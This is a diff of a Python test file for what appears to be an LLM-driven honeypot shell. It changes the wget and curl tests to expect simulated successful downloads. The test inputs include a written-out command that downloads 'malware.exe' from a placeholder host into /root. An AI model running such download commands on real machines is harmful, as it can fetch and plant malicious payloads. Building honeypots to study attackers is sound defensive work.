@@ -15,22 +15,27 @@ def handler():
     return CommandHandler(mock_llm, mock_db)
 
 class TestNetworkPagers:
-    def test_wget_failure(self, handler):
+    def test_wget_success(self, handler):
         start = time.time()
-        # Mock datetime to avoid errors if used
-        resp, _ = handler.handle_wget("wget http://example.com/malware.exe", {})
+        # Mock LLM
+        handler.llm.generate_response.return_value = "<html>Malware</html>"
         
-        assert "unable to resolve" in resp or "failed:" in resp
-        assert "malware.exe" in resp
+        resp, _ = handler.handle_wget("wget -O malware.exe http://example.com/malware.exe", {'session_id': '1', 'cwd': '/root'})
+        
+        # New behavior: Simulated Success + Progress Bar
+        assert "200 OK" in resp
+        assert "Saving to: 'malware.exe'" in resp
+        assert "saved [" in resp
 
-    def test_curl_failure(self, handler):
+    def test_curl_success(self, handler):
         start = time.time()
-        resp, _ = handler.handle_curl("curl http://example.com", {})
+        handler.llm.generate_response.return_value = "<html>Malware</html>"
+        
+        resp, _ = handler.handle_curl("curl http://example.com", {'session_id': '1', 'cwd': '/root'})
         end = time.time()
         
-        assert "curl: (" in resp or "Could not resolve" in resp
-        # Check delay (approx 1.0s)
-        assert (end - start) >= 0.9
+        # Should return content
+        assert "<html>Malware</html>" in resp
 
     def test_more_alias(self, handler):
         # Should behave like cat
